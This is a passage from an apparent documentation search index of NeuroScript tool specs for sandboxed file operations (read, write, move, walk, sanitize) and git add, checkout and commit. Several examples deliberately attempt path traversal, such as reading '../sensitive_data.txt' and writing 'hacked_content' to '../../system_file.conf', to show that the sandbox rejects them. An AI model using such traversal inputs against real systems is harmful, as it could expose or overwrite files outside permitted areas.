destination path.</li> <li>The underlying <code>os.Rename</code> behavior might vary slightly between operating systems or across different filesystem mounts (though usually atomic within the same filesystem).</li> </ul> </li> <li>Examples: <pre><code># Example 1: Rename a file\nCALL FS.WriteFile(\"old_name.txt\", \"File content\")\nSET write_ok = LAST\n\nCALL FS.MoveFile(\"old_name.txt\", \"new_name.txt\")\nSET move_result = LAST\n\nIF move_result[\"error\"] == nil THEN\n    EMIT \"File renamed successfully from old_name.txt to new_name.txt\"\nELSE\n    EMIT \"Error renaming file: \" + move_result[\"error\"]\nENDBLOCK\n\n# Example 2: Move a file into a directory (directory must exist)\nCALL FS.Mkdir(\"data_files\")\nSET mkdir_ok = LAST\n\nCALL FS.MoveFile(\"new_name.txt\", \"data_files/final_name.txt\")\nSET move_into_dir_result = LAST\nIF move_into_dir_result[\"error\"] == nil THEN\n  EMIT \"File moved into directory successfully.\"\nELSE\n  EMIT \"Error moving file into directory: \" + move_into_dir_result[\"error\"]\nENDBLOCK\n\n# Example 3: Attempt to move onto an existing file (will fail)\nCALL FS.WriteFile(\"another_file.txt\", \"Some other content\")\nSET write_another_ok = LAST\n\nEMIT \"Attempting to move onto existing file...\"\nCALL FS.MoveFile(\"data_files/final_name.txt\", \"another_file.txt\")\nSET overwrite_attempt_result = LAST\nIF overwrite_attempt_result[\"error\"] != nil THEN\n    EMIT \"Move failed as expected: \" + overwrite_attempt_result[\"error\"]\n    # Expected error: Destination path 'another_file.txt' already exists.\nELSE\n    EMIT \"Move unexpectedly succeeded when destination existed.\"\nENDBLOCK\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_fs_move.go</code></li> <li>Function: <code>toolMoveFile</code></li> <li>Spec Name: <code>MoveFile</code></li> <li>Key Go Packages: <code>fmt</code>, <code>os</code>, <code>errors</code></li> <li>Helpers: <code>core.SecureFilePath</code></li> <li>Registration: Registered by <code>registerFsMoveTools</code> within <code>pkg/core/tools_fs.go</code>. Returns <code>map[string]interface{}, error</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/fs_readfile/","title":"fs_readfile","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-fs-readfile-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_fs_read.go :: relatedTo: FS.WriteFile :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/fs_readfile/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/fs_readfile/#tool-specification-fsreadfile-v01","title":"Tool Specification: FS.ReadFile (v0.1)","text":"<ul> <li>Tool Name: FS.ReadFile (v0.1)</li> <li>Purpose: Reads the entire content of a specified file and returns it as a string. Primarily used for accessing text-based files within the allowed workspace.</li> <li>NeuroScript Syntax: FS.ReadFile(filepath: ) <li>Arguments:<ul> <li>filepath (String): Required. The relative path to the file within the designated sandbox directory. Absolute paths or paths attempting to traverse outside the sandbox (e.g., ../outside.txt) are forbidden.</li> </ul> </li> <li>Return Value: (String)<ul> <li>On success: The complete content of the file as a string.</li> <li>On error: A string describing the failure (e.g., \"ReadFile path error...\", \"ReadFile failed: File not found...\", \"ReadFile failed for...\"). The underlying Go error is logged internally if a logger is configured but not returned directly to the script.</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (filepath) of type String is provided.</li> <li>Retrieves the interpreter's configured sandboxDir.</li> <li>Uses the SecureFilePath helper to validate the filepath argument against the sandboxDir. This checks:<ul> <li>If the path is relative.</li> <li>If the resolved absolute path is still within the sandboxDir.</li> </ul> </li> <li>If SecureFilePath returns an error (invalid path, outside sandbox), the tool returns an error message string.</li> <li>If the path is secure, the tool attempts to read the entire file content using the validated absolute path (os.ReadFile).</li> <li>If os.ReadFile encounters an error (e.g., file does not exist, permission denied), the tool returns an appropriate error message string.</li> <li>If the file is read successfully, the tool returns its content as a single string.</li> </ol> </li> <li>Security Considerations:<ul> <li>This tool is restricted by the interpreter's sandbox directory (sandboxDir). It cannot read files outside this directory.</li> <li>Relies entirely on the SecureFilePath function for path validation. Any vulnerability in SecureFilePath could potentially allow unauthorized file access.</li> <li>File read permissions are determined by the operating system user running the NeuroScript interpreter.</li> </ul> </li> <li>Examples:     neuroscript  # Read a configuration file  config_content = FS.ReadFile(\"config/settings.json\")  if String.Contains(config_content, \"ReadFile failed\") {  IO.Log(\"Error reading config:\", config_content)  } else {  IO.Log(\"Config loaded.\")  # ... process config_content ...  }   # Attempt to read a file outside the sandbox (will fail)  bad_content = FS.ReadFile(\"../sensitive_data.txt\")  IO.Log(\"Result of bad read:\", bad_content) # Will likely log a path error message </li> <li>Go Implementation Notes:<ul> <li>Location: pkg/core/tools_fs_read.go</li> <li>Function: toolReadFile</li> <li>Key Go Packages: os, fmt</li> <li>Helpers: core.SecureFilePath</li> <li>Registration: Called by registerFsFileTools within pkg/core/tools_fs.go (which itself is called by registerCoreTools in pkg/core/tools_register.go).</li> </ul> </li>"},{"location":"ns/tools/fs_sanitizefilename/","title":"fs_sanitizefilename","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-fs-sanitizefilename-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_fs_utils.go, docs/script_spec.md :: relatedTo: FS.WriteFile, FS.Mkdir :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/fs_sanitizefilename/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/fs_sanitizefilename/#tool-specification-fssanitizefilename-v01","title":"Tool Specification: <code>FS.SanitizeFilename</code> (v0.1)","text":"<ul> <li>Tool Name: <code>FS.SanitizeFilename</code> (v0.1)</li> <li>Purpose: Takes an input string and cleans it by removing or replacing characters that are typically disallowed or problematic in filenames, making it safer to use as part of a file path.</li> <li>NeuroScript Syntax: <code>CALL FS.SanitizeFilename(name: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>name</code> (String): Required. The input string that needs to be sanitized for use in a filename.</li> </ul> </li> <li>Return Value: (String)<ul> <li>The sanitized string, suitable for use as a filename or path component. (Accessible via <code>LAST</code> after the <code>CALL</code>). The exact transformations (e.g., which characters are removed or replaced) depend on the underlying Go implementation (<code>core.SanitizeFilename</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (<code>name</code>) of type String is provided.</li> <li>Calls the internal Go helper function <code>core.SanitizeFilename</code>, passing the input <code>name</code> string.</li> <li>Returns the sanitized string produced by the <code>core.SanitizeFilename</code> function.</li> </ol> </li> <li>Security Considerations:<ul> <li>This tool helps prevent the creation of invalid or potentially malicious filenames (e.g., containing path traversal sequences like <code>../</code>).</li> <li>It is a utility for string manipulation and does not perform sandbox path validation. Tools that perform file operations (like <code>FS.WriteFile</code>, <code>FS.Mkdir</code>) must still use <code>SecureFilePath</code> for proper sandboxing.</li> <li>The effectiveness of the sanitization depends entirely on the rules implemented in the <code>core.SanitizeFilename</code> Go function.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Sanitize a string with spaces and slashes\nSET potentially_bad_name = \"My Report / Version 2\"\nCALL FS.SanitizeFilename(potentially_bad_name)\nSET safe_name = LAST\nEMIT \"Original: '\" + potentially_bad_name + \"' -&gt; Sanitized: '\" + safe_name + \"'\"\n# Example Output might be: 'My_Report_-_Version_2' or similar depending on implementation\n\n# Example 2: Use sanitized name to create a file\nSET user_input_title = \"Data analysis for Q3*?\"\nCALL FS.SanitizeFilename(user_input_title)\nSET filename_base = LAST\nSET full_filename = \"reports/\" + filename_base + \".txt\"\nEMIT \"Attempting to write to: \" + full_filename\nCALL FS.WriteFile(full_filename, \"Report content here.\")\nSET write_status = LAST\nEMIT \"Write status: \" + write_status\n\n# Example 3: Sanitize a simple name (likely no changes)\nSET simple_name = \"document1\"\nCALL FS.SanitizeFilename(simple_name)\nSET sanitized_simple = LAST\nEMIT \"Sanitized simple name: \" + sanitized_simple # Expect 'document1'\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_fs_utils.go</code></li> <li>Function: <code>toolSanitizeFilename</code></li> <li>Spec Name: <code>SanitizeFilename</code></li> <li>Key Go Packages: Relies on the internal <code>core.SanitizeFilename</code> helper.</li> <li>Helpers: <code>core.SanitizeFilename</code> (this function contains the actual sanitization logic).</li> <li>Registration: Registered by <code>registerFsUtilTools</code> within <code>pkg/core/tools_fs.go</code>. Returns <code>string, nil</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/fs_walkdir/","title":"fs_walkdir","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-fs-walkdir-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_fs_walk.go, pkg/core/tools_fs_utils.go, docs/script_spec.md :: relatedTo: FS.ListDirectory :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/fs_walkdir/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/fs_walkdir/#tool-specification-fswalkdir-v01","title":"Tool Specification: <code>FS.WalkDir</code> (v0.1)","text":"<ul> <li>Tool Name: <code>FS.WalkDir</code> (v0.1) (Note: Registered internally via spec named <code>TOOL.WalkDir</code>)</li> <li>Purpose: Recursively walks a directory tree starting from a specified path within the sandbox. It returns a flat list containing information about every file and subdirectory encountered during the traversal (excluding the starting directory itself).</li> <li>NeuroScript Syntax: <code>CALL FS.WalkDir(path: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>path</code> (String): Required. The relative path within the sandbox of the directory where the recursive walk should begin.</li> </ul> </li> <li>Return Value: (List | nil)<ul> <li>On success: A List where each element is a Map representing a file or subdirectory found within the specified <code>path</code>. Each Map contains the following keys:<ul> <li><code>name</code> (String): The base name of the file or directory.</li> <li><code>path</code> (String): The relative path of the entry from the directory specified in the <code>path</code> argument. Uses forward slashes (<code>/</code>) as separators.</li> <li><code>isDir</code> (Boolean): <code>true</code> if the entry is a directory, <code>false</code> otherwise.</li> <li><code>size</code> (Number): The size of the file in bytes. Typically 0 for directories.</li> <li><code>modTime</code> (String): The last modification time in RFC3339 format (e.g., <code>\"2025-04-22T20:36:00Z\"</code>).</li> </ul> </li> <li>On error (e.g., path validation fails, start path is not a directory, permission error during walk): Returns <code>nil</code>. Error details are logged internally. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>Special Case: If the provided start <code>path</code> does not exist, the tool returns <code>nil</code> without logging an internal error (consistent with no files found).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (<code>path</code>) of type String is provided and is not empty.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Uses <code>SecureFilePath</code> to validate the input <code>path</code> against the <code>sandboxDir</code>. Returns <code>nil</code> if validation fails.</li> <li>Checks if the validated path exists using <code>os.Stat</code>. If it doesn't exist, returns <code>nil</code>. If other stat errors occur, returns <code>nil</code>.</li> <li>Checks if the validated path is a directory. Returns <code>nil</code> if it's not.</li> <li>Initializes an empty list to store results.</li> <li>Uses <code>filepath.WalkDir</code> to recursively traverse the directory tree starting from the validated path.</li> <li>For each item encountered during the walk (file or directory):<ul> <li>Skips the entry if it's the starting directory itself.</li> <li>Retrieves file metadata (<code>name</code>, <code>isDir</code>, <code>size</code>, <code>modTime</code>).</li> <li>Calculates the item's path relative to the starting directory.</li> <li>Creates a Map containing the retrieved metadata (<code>name</code>, <code>path</code>, <code>isDir</code>, <code>size</code>, <code>modTime</code>).</li> <li>Appends this Map to the results list.</li> <li>If an error occurs while accessing an item or its metadata during the walk (e.g., permission denied), the walk is likely terminated, and the tool proceeds to step 9.</li> </ul> </li> <li>If <code>filepath.WalkDir</code> completes without returning an error, returns the populated list of Maps.</li> <li>If <code>filepath.WalkDir</code> returns an error (due to errors in the walking process itself or errors returned by the callback function, like permission errors), the tool logs the error and returns <code>nil</code>.</li> </ol> </li> <li>Security Considerations:<ul> <li>The walk is confined to the directory tree starting within the validated sandbox path due to the initial <code>SecureFilePath</code> check.</li> <li>Reads only file/directory metadata, not content.</li> <li><code>filepath.WalkDir</code> does not follow symbolic links, preventing escapes via symlinks outside the initial validated path.</li> <li>Permission errors encountered during the walk can prevent parts of the directory tree from being listed and may cause the tool to return <code>nil</code> prematurely.</li> </ul> </li> <li>Examples: <pre><code># Prerequisite: Create some nested files/dirs\nCALL FS.Mkdir(\"walktest/subdir\")\nCALL FS.WriteFile(\"walktest/file1.txt\", \"Content A\")\nCALL FS.WriteFile(\"walktest/subdir/file2.js\", \"Content B\")\n\n# Example 1: Walk the directory\nEMIT \"Walking directory 'walktest'...\"\nCALL FS.WalkDir(\"walktest\")\nSET walk_results = LAST\n\nIF walk_results == nil THEN\n  EMIT \"Error walking 'walktest' or directory is empty/doesn't exist.\"\nELSE\n  EMIT \"Walk Results:\"\n  FOR EACH entry IN walk_results DO\n    EMIT \" - Path: \" + entry[\"path\"] + \", IsDir: \" + entry[\"isDir\"] + \", Size: \" + entry[\"size\"]\n    # Expected output (order may vary):\n    # - Path: file1.txt, IsDir: false, Size: 9\n    # - Path: subdir, IsDir: true, Size: 0\n    # - Path: subdir/file2.js, IsDir: false, Size: 9\n  ENDBLOCK\nENDBLOCK\n\n# Example 2: Walk a non-existent directory\nEMIT \"Walking non-existent directory 'no_such_dir'...\"\nCALL FS.WalkDir(\"no_such_dir\")\nSET non_existent_results = LAST\nIF non_existent_results == nil THEN\n  EMIT \"WalkDir returned nil for non-existent path (expected).\"\nELSE\n  EMIT \"WalkDir unexpectedly returned results for non-existent path.\"\nENDBLOCK\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_fs_walk.go</code></li> <li>Function: <code>toolWalkDir</code></li> <li>Spec Name: <code>TOOL.WalkDir</code> (in <code>tools_fs_utils.go</code>)</li> <li>Key Go Packages: <code>os</code>, <code>fmt</code>, <code>path/filepath</code>, <code>io/fs</code>, <code>time</code>, <code>errors</code></li> <li>Helpers: <code>core.SecureFilePath</code></li> <li>Registration: Registered via <code>registerFsUtilTools</code> slice in <code>pkg/core/tools_fs_utils.go</code>. Returns <code>[]map[string]interface{}, error</code>. Handles errors to return <code>nil</code> list.</li> </ul> </li> </ul>"},{"location":"ns/tools/fs_writefile/","title":"fs_writefile","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.1 # Incremented version due to example correction :: id: tool-spec-fs-writefile-v0.1.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_fs_write.go, docs/script_spec.md :: relatedTo: FS.ReadFile :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/fs_writefile/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/fs_writefile/#tool-specification-fswritefile-v011","title":"Tool Specification: <code>FS.WriteFile</code> (v0.1.1)","text":"<ul> <li>Tool Name: <code>FS.WriteFile</code> (v0.1.1)</li> <li>Purpose: Writes provided string content to a specified file within the designated sandbox directory. Creates parent directories if they don't exist and overwrites the file if it already exists.</li> <li>NeuroScript Syntax: <code>CALL FS.WriteFile(filepath: &lt;String&gt;, content: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>filepath</code> (String): Required. The relative path to the file within the designated sandbox directory. Absolute paths or paths attempting to traverse outside the sandbox are forbidden.</li> <li><code>content</code> (String): Required. The string content to be written to the file.</li> </ul> </li> <li>Return Value: (String)<ul> <li>On success: The literal string \"OK\". (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>On error: A string describing the failure (e.g., \"WriteFile path error...\", \"WriteFile mkdir failed...\", \"WriteFile failed for...\"). (Accessible via <code>LAST</code> after the <code>CALL</code>). The underlying Go error is logged internally if a logger is configured.</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly two arguments (<code>filepath</code>, <code>content</code>), both of type String, are provided.</li> <li>Retrieves the interpreter's configured <code>sandboxDir</code>.</li> <li>Uses the <code>SecureFilePath</code> helper to validate the <code>filepath</code> argument against the <code>sandboxDir</code>. Checks if the path is relative and stays within the sandbox.</li> <li>If <code>SecureFilePath</code> returns an error (invalid path, outside sandbox), the tool returns an error message string.</li> <li>If the path is secure, the tool determines the parent directory of the validated absolute path.</li> <li>It attempts to create all necessary parent directories using <code>os.MkdirAll</code> with default permissions (0755).</li> <li>If creating directories fails, the tool returns an error message string.</li> <li>If directories exist or are created successfully, the tool attempts to write the <code>content</code> string to the validated absolute file path using <code>os.WriteFile</code>, overwriting any existing file content. Files are written with permissions 0644.</li> <li>If writing the file fails, the tool returns an error message string.</li> <li>If the file is written successfully, the tool returns the string \"OK\".</li> </ol> </li> <li>Security Considerations:<ul> <li>This tool is restricted by the interpreter's sandbox directory (<code>sandboxDir</code>). It cannot write files outside this directory.</li> <li>Relies on <code>SecureFilePath</code> for path validation. Flaws in validation could permit writing to unintended locations within the sandbox.</li> <li>Has the ability to overwrite existing files within the sandbox. Use with caution, especially in automated scripts.</li> <li>Creates directories within the sandbox as needed.</li> <li>File write permissions are ultimately governed by the OS user running the interpreter, though the tool attempts to set mode 0644.</li> </ul> </li> <li>Examples: (Updated to conform to <code>script_spec.md</code> v1.1.0)     <pre><code># Example 1: Write a simple status message to a file\nSET log_message = \"Script finished successfully.\"\nCALL FS.WriteFile(\"logs/script_run.log\", log_message)\nSET write_status = LAST\nIF write_status != \"OK\" THEN\n    EMIT \"Error writing log file: \" + write_status\nELSE\n    EMIT \"Log file write successful.\"\nENDBLOCK\n\n# Example 2: Create a config file in a subdirectory\nSET config_data = \"{ \\\"setting\\\": \\\"value\\\", \\\"enabled\\\": true }\" # JSON-like string content\nCALL FS.WriteFile(\"config/app_settings.json\", config_data)\nSET config_status = LAST\nIF config_status == \"OK\" THEN\n    EMIT \"Config file created.\"\nELSE\n    EMIT \"Failed to create config: \" + config_status\nENDBLOCK\n\n# Example 3: Attempt to write outside the sandbox (will fail)\nCALL FS.WriteFile(\"../../system_file.conf\", \"hacked_content\")\nSET bad_write_status = LAST\n# The status will contain an error message from SecureFilePath\nEMIT \"Result of attempting restricted write: \" + bad_write_status\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_fs_write.go</code></li> <li>Function: <code>toolWriteFile</code></li> <li>Key Go Packages: <code>os</code>, <code>fmt</code>, <code>path/filepath</code></li> <li>Helpers: <code>core.SecureFilePath</code></li> <li>Registration: Called by <code>registerFsFileTools</code> within <code>pkg/core/tools_fs.go</code> (which itself is called by <code>registerCoreTools</code> in <code>pkg/core/tools_register.go</code>).</li> </ul> </li> </ul>"},{"location":"ns/tools/git_add/","title":"git_add","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-git-gitadd-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_git_register.go, pkg/core/tools_git.go, docs/script_spec.md :: relatedTo: Git.GitCommit, Git.GitStatus :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/git_add/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/git_add/#tool-specification-gitgitadd-v01","title":"Tool Specification: <code>Git.GitAdd</code> (v0.1)","text":"<ul> <li>Tool Name: <code>Git.GitAdd</code> (v0.1)</li> <li>Purpose: Stages changes in one or more specified files or directories for the next Git commit. This is equivalent to running <code>git add &lt;path1&gt; &lt;path2&gt; ...</code> within the project's sandbox directory.</li> <li>NeuroScript Syntax: <code>CALL Git.GitAdd(paths: &lt;List[String]&gt;)</code></li> <li>Arguments:<ul> <li><code>paths</code> (List of Strings): Required. A list containing one or more relative paths (strings) within the sandbox. These paths specify the files or directories whose changes should be staged.</li> </ul> </li> <li>Return Value: (String)<ul> <li>On success: A string indicating success, potentially including the output from the <code>git add</code> command. Example: <code>\"GitAdd successful for paths: [file1.txt dir/file2.go].\\nOutput:\\n\"</code> (Output may be empty if successful). (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>On error: A string describing the failure. This could be due to path validation errors (e.g., \"GitAdd path error for '...': ...\") or errors from the underlying <code>git add</code> command execution (e.g., \"GitAdd failed: ...\"). (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (<code>paths</code>) is provided and that it is a List containing only Strings.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Iterates through each path string in the input <code>paths</code> list.</li> <li>For each path, uses <code>SecureFilePath</code> to validate it against the <code>sandboxDir</code>. If any path fails validation, returns an error message string immediately.</li> <li>If all paths are validated, constructs a command equivalent to <code>git add &lt;path1&gt; &lt;path2&gt; ...</code> using the validated relative paths.</li> <li>Executes the <code>git add</code> command within the <code>sandboxDir</code> using the <code>toolExec</code> helper function.</li> <li>If the command execution fails (e.g., <code>git</code> not found, <code>git add</code> returns an error), returns an error message string containing details from <code>toolExec</code>.</li> <li>If the command execution succeeds, returns a success message string, including any standard output from the <code>git add</code> command.</li> </ol> </li> <li>Security Considerations:<ul> <li>Uses <code>SecureFilePath</code> to ensure all specified paths are within the configured sandbox before passing them to the <code>git</code> command.</li> <li>Relies on the <code>toolExec</code> helper for command execution, which should execute commands within the <code>sandboxDir</code>.</li> <li>Modifies the Git index (staging area) of the repository located within the <code>sandboxDir</code>.</li> <li>Assumes the <code>git</code> executable is available in the environment's PATH where the NeuroScript interpreter is running.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Stage a single modified file\nCALL FS.WriteFile(\"README.md\", \"Updated content.\") # Modify a file\nSET write_ok = LAST\n\nCALL Git.GitAdd([\"README.md\"])\nSET add_status = LAST\nEMIT \"Git Add status: \" + add_status\n\n# Example 2: Stage multiple files/directories\nCALL FS.WriteFile(\"src/main.go\", \"// New Go code\")\nCALL FS.WriteFile(\"docs/guide.md\", \"New documentation section.\")\nSET write_multi_ok = LAST\n\nSET files_to_add = [\"src/main.go\", \"docs/\"] # Add a file and a directory\nCALL Git.GitAdd(files_to_add)\nSET add_multi_status = LAST\nEMIT \"Git Add multiple status: \" + add_multi_status\n\n# Example 3: Attempt to add a file outside the sandbox (will fail validation)\nCALL Git.GitAdd([\"../sensitive_info.txt\"])\nSET add_bad_path_status = LAST\nEMIT \"Git Add bad path status: \" + add_bad_path_status\n# Expect error like: \"GitAdd path error for '../sensitive_info.txt': Path is outside sandbox\"\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_git.go</code></li> <li>Function: <code>toolGitAdd</code></li> <li>Spec Name: <code>GitAdd</code> (in <code>pkg/core/tools_git_register.go</code>)</li> <li>Key Go Packages: <code>fmt</code>, <code>strings</code>, <code>errors</code></li> <li>Helpers: <code>core.SecureFilePath</code>, <code>core.toolExec</code></li> <li>Registration: Registered by <code>registerGitTools</code> within <code>pkg/core/tools_register.go</code>. Returns <code>string, error</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/git_checkout/","title":"git_checkout","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-git-gitcheckout-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_git_register.go, pkg/core/tools_git.go, docs/script_spec.md :: relatedTo: Git.GitNewBranch, Git.GitStatus :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/git_checkout/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/git_checkout/#tool-specification-gitgitcheckout-v01","title":"Tool Specification: <code>Git.GitCheckout</code> (v0.1)","text":"<ul> <li>Tool Name: <code>Git.GitCheckout</code> (v0.1)</li> <li>Purpose: Switches the current working branch or restores working tree files. Typically used to switch to an existing branch, but can also check out specific commits or tags. This is equivalent to running <code>git checkout &lt;branch_name&gt;</code> within the project's sandbox directory.</li> <li>NeuroScript Syntax: <code>CALL Git.GitCheckout(branch_name: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>branch_name</code> (String): Required. The name of the existing branch, tag, or commit hash to check out. It cannot be an empty string.</li> </ul> </li> <li>Return Value: (String)<ul> <li>On success: A string indicating the checkout was successful, potentially including output from the <code>git checkout</code> command. Example: <code>\"Successfully checked out branch/ref 'main'.\\nOutput:\\nSwitched to branch 'main'\\nYour branch is up to date with 'origin/main'.\\n\"</code>. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>On error: A string describing the failure. This could be due to an empty <code>branch_name</code>, or errors from the underlying <code>git checkout</code> command execution (e.g., \"failed to checkout branch/ref '...': error: pathspec '...' did not match any file(s) known to git\", or errors about uncommitted changes). (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (<code>branch_name</code>) of type String is provided.</li> <li>Validates that the <code>branch_name</code> is not empty. If it is, returns an error message string.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Constructs a command equivalent to <code>git checkout \"&lt;branch_name&gt;\"</code>.</li> <li>Executes the <code>git checkout</code> command within the <code>sandboxDir</code> using the <code>toolExec</code> helper function.</li> <li>If the command execution fails (e.g., <code>git</code> not found, branch/ref does not exist, uncommitted changes prevent checkout), returns an error message string containing details from <code>toolExec</code>.</li> <li>If the command execution succeeds, returns a success message string, including the target branch/ref name and any standard output from the <code>git checkout</code> command.</li> </ol> </li> <li>Security Considerations:<ul> <li>Executes the <code>git checkout</code> command within the configured sandbox directory.</li> <li>Modifies the Git repository state by updating the HEAD reference.</li> <li>Can potentially modify files in the working directory to match the state of the checked-out branch/commit. Uncommitted changes in the working directory may be lost or cause the command to fail, depending on the state and the specific <code>git checkout</code> behavior.</li> <li>Relies on the <code>toolExec</code> helper for command execution.</li> <li>Assumes the <code>git</code> executable is available in the environment's PATH where the NeuroScript interpreter is running.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Checkout an existing branch (e.g., 'main')\nCALL Git.GitCheckout(\"main\")\nSET checkout_main_status = LAST\nEMIT \"Checkout 'main' status: \" + checkout_main_status\n\n# Example 2: Checkout the previously created feature branch\n# Assume 'feature/add-user-auth' was created successfully before\nCALL Git.GitCheckout(\"feature/add-user-auth\")\nSET checkout_feature_status = LAST\nEMIT \"Checkout 'feature/add-user-auth' status: \" + checkout_feature_status\n\n# Example 3: Attempt to checkout a non-existent branch\nCALL Git.GitCheckout(\"no-such-branch-exists\")\nSET non_existent_status = LAST\nEMIT \"Status for checking out non-existent branch: \" + non_existent_status\n# Expect error like: \"failed to checkout branch/ref 'no-such-branch-exists': error: pathspec 'no-such-branch-exists' did not match any file(s) known to git.\"\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_git.go</code></li> <li>Function: <code>toolGitCheckout</code></li> <li>Spec Name: <code>GitCheckout</code> (in <code>pkg/core/tools_git_register.go</code>)</li> <li>Key Go Packages: <code>fmt</code></li> <li>Helpers: <code>core.toolExec</code>, <code>core.ErrValidationArgValue</code></li> <li>Registration: Registered by <code>registerGitTools</code> within <code>pkg/core/tools_register.go</code>. Returns <code>string, error</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/git_commit/","title":"git_commit","text":"<p>@@@:: type: NSproject @@@:: subtype: tool_spec @@@:: version: 0.1.0 @@@:: id: tool-spec-git-gitcommit-v0.1 @@@:: status: draft @@@:: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_git_register.go, pkg/core/tools_git.go, docs/script_spec.md @@@:: relatedTo: Git.GitAdd, Git.GitStatus @@@:: developedBy: AI @@@:: reviewedBy: User @@@ @@@# Tool Specification Structure Template @@@ @@@## Tool Specification: <code>Git.GitCommit</code> (v0.1) @@@ @@@ Tool Name: <code>Git.GitCommit</code> (v0.1) @@@ Purpose: Creates a new commit containing the currently staged changes. This is equivalent to running <code>git commit -m \"&lt;message&gt;\"</code> within the project's sandbox directory. @@@ NeuroScript Syntax: <code>CALL Git.GitCommit(message: &lt;String&gt;)</code> @@@ Arguments: @@@    * <code>message</code> (String): Required. The commit message describing the changes being committed. This message cannot be an empty string. @@@ Return Value: (String) @@@    * On success: A string indicating the commit was successful, including the commit message and potentially output from the <code>git commit</code> command. Example: <code>\"GitCommit successful. Message: \"Fix typo in README\".\\nOutput:\\n[main abc1234] Fix typo in README\\n 1 file changed, 1 insertion(+), 1 deletion(-)\\n\"</code>. (Accessible via <code>LAST</code> after the <code>CALL</code>). @@@    * On error: A string describing the failure. This could be due to an empty commit message (\"commit message cannot be empty\"), nothing being staged for commit, or other errors from the underlying <code>git commit</code> command execution (e.g., \"GitCommit failed: ...\"). (Accessible via <code>LAST</code> after the <code>CALL</code>). @@@ Behavior: @@@    1.  Validates that exactly one argument (<code>message</code>) of type String is provided. @@@    2.  Validates that the <code>message</code> is not empty. If it is, returns an error message string. @@@    3.  Retrieves the interpreter's <code>sandboxDir</code>. @@@    4.  Constructs a command equivalent to <code>git commit -m \"&lt;message&gt;\"</code>. @@@    5.  Executes the <code>git commit</code> command within the <code>sandboxDir</code> using the <code>toolExec</code> helper function. @@@    6.  If the command execution fails (e.g., <code>git</code> not found, nothing staged, commit hook failure), returns an error message string containing details from <code>toolExec</code>. @@@    7.  If the command execution succeeds, returns a success message string, including the original commit message and any standard output from the <code>git commit</code> command. @@@ Security Considerations: @@@    * Executes the <code>git commit</code> command within the configured sandbox directory. @@@    * Modifies the Git repository history by creating a new commit object. @@@    * Relies on the <code>toolExec</code> helper for command execution. @@@    * Assumes the <code>git</code> executable is available in the environment's PATH where the NeuroScript interpreter is running. @@@ Examples: @@@    <code>neuroscript @@@    # Example 1: Commit previously staged changes @@@    # Assume Git.GitAdd([\"README.md\"]) was called successfully before @@@    SET commit_message = \"Update project README with installation instructions\" @@@    CALL 